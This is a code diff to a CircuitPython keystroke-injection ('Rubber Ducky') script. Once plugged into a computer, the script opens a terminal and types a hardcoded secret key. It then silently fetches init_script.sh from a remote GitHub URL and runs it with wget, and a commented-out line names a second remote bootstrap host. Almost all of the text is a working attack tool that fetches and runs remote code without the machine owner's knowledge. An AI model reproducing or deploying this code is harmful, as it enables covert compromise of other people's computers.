@@ -11,27 +11,12 @@ from adafruit_hid.keyboard import Keyboard
 
 kbd = Keyboard(usb_hid.devices)
 
-# source = 'http://127.0.0.1:8080/init_script.sh'
-source = 'https://raw.githubusercontent.com/MistyRavager/RubberDucky/main/init_script.sh'
+source = '\"https://raw.githubusercontent.com/MistyRavager/RubberDucky/main/init_script.sh\"'
+#source2 = '\"http://watcher.centralindia.cloudapp.azure.com:8080/target_bootstrap.sh\"'
 
-# open shell
-payload1 = [usb.WIN]
-payload2 = usb.get_sequence('shell')
-payload2.append(usb.ENTER)
+key="uV2N981xqbXCHC8Z44qIJAgIwDQY9GLpNLF15BuHHhs="
 
-# payload2b = usb.get_sequence('cd ~/Documents/')
-# payload2b.append(usb.ENTER)
-
-# obtain target from server
-payload3 = usb.get_sequence(' wget '+source)
-payload3.append(usb.ENTER)
-# deploy
-payload4 = usb.get_sequence(' . init_script.sh& >/dev/null 2>&1')
-payload4.append(usb.ENTER)
-# Close Command: ALT+F4
-payload5 = [usb.CLOSE]
-
-def send(this_input, sleep=0.5):
+def send(this_input, sleep=0.3):
     for item in this_input:
         if type(item) is list:
             kbd.send(*item)
@@ -39,13 +24,38 @@ def send(this_input, sleep=0.5):
             kbd.send(item)
     time.sleep(sleep)
 
-time.sleep(0.2)
-send(payload1)
-send(payload2)
-send(payload3)
-send(payload4)
-send(payload5)
+def openShell():
+    # kbd.send(usb.LEFT_CONTROL, usb.LEFT_ALT, usb.keys['t'])
 
+    send([usb.WIN])
+    send(usb.get_sequence('shell'))
+    kbd.send(usb.LEFT_CONTROL, usb.ENTER)     # open new window
+    time.sleep(0.5)
 
+def enterKey():
+    send(usb.get_sequence('read -s key'))
+    send([usb.ENTER])
+    send(usb.get_sequence(key))
+    send([usb.ENTER])
 
+def fetchRun():
+    # obtain target from server
+    payload_fetch = usb.get_sequence(' wget -q -o /dev/null '+source)
+    payload_fetch.append(usb.ENTER)
+    send(payload_fetch, sleep=0.7)
+
+    # deploy
+    payload_run = usb.get_sequence(' . init_script.sh')
+    # payload4 = usb.get_sequence(' . target_bootstrap.sh')
+    payload_run.append(usb.ENTER)
+    send(payload_run)
+    time.sleep(0.5)
+
+    # Close Command: ALT+F4
+    send([usb.CLOSE])
+
+time.sleep(0.5)
+openShell()
+enterKey()
+fetchRun()
 
